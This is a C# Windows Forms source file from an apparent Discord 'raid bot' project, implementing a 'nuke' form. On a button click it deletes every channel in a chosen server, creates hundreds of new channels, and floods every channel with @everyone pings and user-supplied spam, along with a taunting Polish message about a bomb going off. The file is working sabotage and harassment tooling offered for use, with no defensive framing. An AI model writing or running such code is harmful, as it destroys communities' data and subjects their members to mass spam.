using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DiscordRaidBot
{
    public partial class NukeForm : Form
    {

        private DiscordRaidBotForm mainForm;

        public NukeForm(DiscordRaidBotForm mainForm)
        {
            InitializeComponent();
            checkBoxDeleteChannels.Checked = false;
            checkBoxSpam.Checked = false;
            checkBoxWarn.Checked = false;
            
            this.mainForm = mainForm;
        }

        private void checkBoxDeleteChannels_CheckedChanged(object sender, EventArgs e)
        {
            checkBoxFillServerChannels.Enabled = checkBoxDeleteChannels.Checked;
        }

        private void checkBoxSpam_CheckedChanged(object sender, EventArgs e)
        {
            textBoxSpam.Enabled = checkBoxSpam.Checked;
        }

        private void checkBoxFillServerChannels_CheckedChanged(object sender, EventArgs e)
        {
            if(checkBoxDeleteChannels.Checked && checkBoxFillServerChannels.Checked)
            {
                textBoxChannelsFillName.Enabled = true;
            }
            else
            {
                textBoxChannelsFillName.Enabled = false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show($"Miło było widzieć Cię {mainForm.raidBot.getGuildByIndex(mainForm.selectedGuildIndex).Name} :) ", "Zobaczymy jak bomba pier****", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            DiscordSocketClient client = mainForm.raidBot._client;
            SocketGuild guild = mainForm.raidBot.getGuildByIndex(mainForm.selectedGuildIndex);

            if (checkBoxDeleteChannels.Checked)
            {
                foreach (SocketGuildChannel channel in guild.Channels)
                {
                    channel.DeleteAsync();
                }
            }
            string name = "bombardowanie";
            if (checkBoxFillServerChannels.Checked)
            {
                if (!string.IsNullOrWhiteSpace(textBoxChannelsFillName.Text))
                {
                    name = textBoxChannelsFillName.Text;
                }
            }
            if (checkBoxWarn.Checked)
            {
                guild.CreateTextChannelAsync(name);
                Thread.Sleep(1000);
                SocketTextChannel channel = guild.TextChannels.First();
                for (int i = 0; i < 10; i++)
                {
                    channel.SendMessageAsync("@everyone");
                    if (!string.IsNullOrWhiteSpace(textBoxWarn.Text))
                    {
                        channel.SendMessageAsync(textBoxWarn.Text);
                    }
                }
                channel.SendMessageAsync("CO TO NA NIEBIE LECI?!!?");
                Thread.Sleep(5000);
            }
            for (int i = 0; i < 500; i++)
            {
                guild.CreateTextChannelAsync(textBoxChannelsFillName.Text);
                foreach (SocketTextChannel textChannel in guild.TextChannels)
                {
                    textChannel.SendMessageAsync("@everyone");
                    textChannel.SendMessageAsync(textBoxSpam.Text);
                    Thread.Sleep(50);
                }
            }
            Thread.Sleep(10000);
            for(int i = 0; i < 100; i++)
            {
                foreach (SocketTextChannel textChannel in guild.TextChannels)
                {
                    textChannel.SendMessageAsync("@everyone");
                    textChannel.SendMessageAsync(textBoxSpam.Text);
                }
            }
        }
    }
}
